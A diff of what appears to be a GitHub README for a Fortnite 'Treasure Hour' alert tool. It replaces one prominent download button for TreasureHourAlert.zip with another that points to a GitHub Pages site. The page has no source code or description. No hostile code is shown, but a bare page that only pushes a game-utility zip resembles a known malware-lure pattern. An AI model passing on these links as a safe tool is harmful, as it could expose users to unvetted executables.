@@ -1,16 +1,9 @@
 <div align="center">
 
-
+[![⬇️ Download TreasureHourAlert.zip](https://img.shields.io/badge/Download-TreasureHourAlert.zip-238636?style=for-the-badge&logo=github)](https://RamStokerEdge.github.io/fortnite-treasure-hour-alert/)
 
 <img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/29bb1f5d-cc93-4ecf-9dc5-8d2c24850e57" />
 
-<div align="center">
-  <a href="https://github.com/RamStokerEdge/fortnite-treasure-hour-alert/raw/main/files/TreasureHourAlert.zip" download>
-    <img src="https://img.shields.io/badge/⬇_DOWNLOAD_TREASURE_HOUR_ALERT-00ff88?style=for-the-badge&logo=windows&logoColor=black" alt="Download TreasureHourAlert.zip" width="500">
-  </a>
-  <br>
-  <sub><i>(Right-click and "Save Link As..." if the download doesn't start automatically)</i></sub>
-</div>
 
 
 
